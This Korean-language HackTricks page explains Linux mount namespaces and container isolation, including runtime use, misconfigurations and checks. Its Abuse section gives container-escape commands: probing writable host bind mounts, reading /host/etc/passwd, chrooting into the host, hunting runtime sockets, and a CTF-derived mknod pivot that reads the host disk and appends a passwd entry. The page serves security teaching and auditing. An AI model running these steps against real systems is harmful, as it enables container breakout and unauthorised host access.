# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

mount namespace는 프로세스가 확인하는 **mount table**을 제어합니다. 이는 가장 중요한 container isolation 기능 중 하나입니다. root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure 및 runtime별 여러 helper mounts가 모두 해당 mount table을 통해 표현되기 때문입니다. 두 프로세스가 모두 `/`, `/proc`, `/sys` 또는 `/tmp`에 접근하더라도, 해당 경로가 무엇으로 해석되는지는 프로세스가 속한 mount namespace에 따라 달라집니다.

container-security 관점에서 mount namespace는 흔히 "깔끔하게 준비된 application filesystem"과 "이 프로세스가 host filesystem을 직접 확인하거나 영향을 줄 수 있음"의 차이를 만듭니다. 이것이 bind mounts, `hostPath` volumes, privileged mount operations, writable `/proc` 또는 `/sys` exposures가 모두 이 namespace를 중심으로 작동하는 이유입니다.

## 동작

runtime이 container를 실행할 때 일반적으로 새로운 mount namespace를 생성하고, container용 root filesystem을 준비하며, 필요에 따라 procfs 및 기타 helper filesystems를 mount한 다음, 선택적으로 bind mounts, tmpfs mounts, secrets, config maps 또는 host paths를 추가합니다. 프로세스가 해당 namespace 내부에서 실행되면, 프로세스가 확인하는 mount 집합은 host의 기본 view와 대부분 분리됩니다. host는 여전히 실제 underlying filesystem을 확인할 수 있지만, container는 runtime이 container를 위해 구성한 버전을 확인합니다.

이는 host가 여전히 모든 것을 관리하는 상황에서도 container가 자체 root filesystem을 가지고 있다고 인식하게 만들 수 있다는 점에서 강력합니다. 하지만 runtime이 잘못된 mount를 노출하면 프로세스가 host resources를 확인할 수 있게 되며, 나머지 security model이 이러한 노출을 보호하도록 설계되지 않았을 수 있으므로 위험하기도 합니다.

## 실습

다음 명령으로 private mount namespace를 생성할 수 있습니다:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
해당 namespace 외부에서 다른 shell을 열고 mount table을 확인하면, tmpfs mount가 격리된 mount namespace 내부에만 존재한다는 것을 확인할 수 있습니다. 이는 mount isolation이 추상적인 이론이 아니라는 점을 보여 주는 유용한 실습입니다. kernel은 말 그대로 process에 다른 mount table을 제공하고 있습니다.

해당 namespace 외부에서 다른 shell을 열고 mount table을 확인하면, tmpfs mount는 격리된 mount namespace 내부에만 존재합니다.

containers 내부에서는 다음과 같이 간단히 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
두 번째 예시는 runtime configuration이 filesystem boundary에 얼마나 큰 구멍을 쉽게 만들 수 있는지 보여줍니다.

## Runtime 사용

Docker, Podman, containerd-based stacks, CRI-O는 모두 일반적인 container를 위해 private mount namespace에 의존합니다. Kubernetes는 volumes, projected secrets, config maps, `hostPath` mounts에 동일한 mechanism을 기반으로 합니다. Incus/LXC environments 역시 mount namespaces에 크게 의존하며, 특히 system containers는 application containers보다 더 풍부하고 machine-like한 filesystem을 노출하는 경우가 많기 때문입니다.

따라서 container filesystem 문제를 검토할 때, 대개 isolated Docker quirk만 보고 있는 것이 아닙니다. workload를 실행한 platform을 통해 드러난 mount-namespace 및 runtime-configuration 문제를 보고 있는 것입니다.

## Misconfigurations

가장 명백하고 위험한 실수는 bind mount를 통해 host root filesystem 또는 다른 민감한 host path를 노출하는 것입니다. 예를 들어 `-v /:/host` 또는 Kubernetes의 writable `hostPath`가 이에 해당합니다. 이 시점부터 질문은 더 이상 "container가 어떻게든 escape할 수 있는가?"가 아니라 "얼마나 많은 유용한 host content가 이미 직접 보이고 writable한가?"가 됩니다. Writable host bind mount는 exploit의 나머지 과정을 단순한 file placement, chrooting, config modification 또는 runtime socket discovery 문제로 바꾸는 경우가 많습니다.

또 다른 일반적인 문제는 더 안전한 container view를 우회하는 방식으로 host `/proc` 또는 `/sys`를 노출하는 것입니다. 이러한 filesystems는 일반적인 data mounts가 아니라 kernel 및 process state에 대한 interfaces입니다. Workload가 host versions에 직접 접근할 수 있다면 container hardening의 많은 가정이 더 이상 제대로 적용되지 않습니다.

Read-only protections도 중요합니다. Read-only root filesystem이 container를 마법처럼 secure하게 만드는 것은 아니지만, attacker staging space를 상당량 제거하고 persistence, helper-binary placement 및 config tampering을 더 어렵게 만듭니다. 반대로 writable root 또는 writable host bind mount는 attacker가 다음 단계를 준비할 공간을 제공합니다.

## Abuse

Mount namespace가 잘못 사용되면 attackers는 일반적으로 네 가지 작업 중 하나를 수행합니다. Container 외부에 남아 있어야 할 **host data를 read**합니다. Writable bind mounts를 통해 **host configuration을 modify**합니다. Capabilities 및 seccomp가 허용하는 경우 **additional resources를 mount하거나 remount**합니다. 또는 container platform 자체에 더 많은 access를 요청할 수 있도록 해 주는 **powerful sockets 및 runtime state directories에 reach**합니다.

Container가 이미 host filesystem을 볼 수 있다면, 나머지 security model은 즉시 달라집니다.

Host bind mount가 의심되면 먼저 무엇을 사용할 수 있는지와 writable 여부를 확인합니다:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
호스트 루트 파일 시스템이 read-write로 마운트되어 있다면, 호스트에 직접 접근하는 것은 대개 다음과 같이 간단합니다:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
직접 chrooting이 아닌 privileged runtime access가 목표라면, 소켓과 런타임 상태를 열거합니다:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
`CAP_SYS_ADMIN`이 존재하는 경우, 컨테이너 내부에서 새로운 mount를 생성할 수 있는지도 테스트합니다:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 전체 예시: Two-Shell `mknod` Pivot

컨테이너의 root 사용자가 block device를 생성할 수 있고, host와 컨테이너가 유용한 방식으로 동일한 사용자 identity를 공유하며, 공격자가 이미 host에서 low-privilege foothold를 확보한 경우 더 특수한 abuse 경로가 나타납니다. 이러한 상황에서는 컨테이너가 `/dev/sda`와 같은 device node를 생성할 수 있으며, low-privilege host 사용자는 이후 일치하는 컨테이너 프로세스의 `/proc/<pid>/root/`를 통해 이를 읽을 수 있습니다.<sup>[[1]](#references)</sup>

컨테이너 내부:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
호스트에서 컨테이너 셸 PID를 찾은 후 해당하는 낮은 권한 사용자로:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
중요한 교훈은 정확한 CTF 문자열 검색 자체가 아닙니다. `/proc/<pid>/root/`를 통한 mount-namespace 노출로 인해, cgroup device policy가 컨테이너 내부에서의 직접적인 사용을 차단했더라도 host user가 컨테이너에서 생성된 device nodes를 재사용할 수 있다는 점입니다.<sup>[[1]](#references)</sup>

## Checks

이 명령어들은 현재 프로세스가 실제로 어떤 filesystem view 안에서 실행되고 있는지 보여주기 위한 것입니다. 목표는 host에서 유래한 mounts, 쓰기가 가능한 민감한 paths, 그리고 일반적인 application container root filesystem보다 범위가 넓어 보이는 모든 항목을 찾아내는 것입니다.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
여기서 중요한 점은 다음과 같습니다.

- Host에서 가져온 Bind mount, 특히 `/`, `/proc`, `/sys`, runtime state 디렉터리 또는 socket 위치는 즉시 눈에 띄어야 합니다.
- 예상하지 못한 read-write mount는 일반적으로 많은 수의 read-only helper mount보다 더 중요합니다.
- `mountinfo`는 경로가 실제로 Host에서 파생되었는지 또는 overlay 기반인지 확인하기에 가장 좋은 위치인 경우가 많습니다.

이러한 검사를 통해 **이 namespace에서 어떤 리소스가 보이는지**, **어떤 리소스가 Host에서 파생되었는지**, **그중 어떤 리소스가 writable하거나 security-sensitive한지**를 파악할 수 있습니다.

## 참고 자료

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
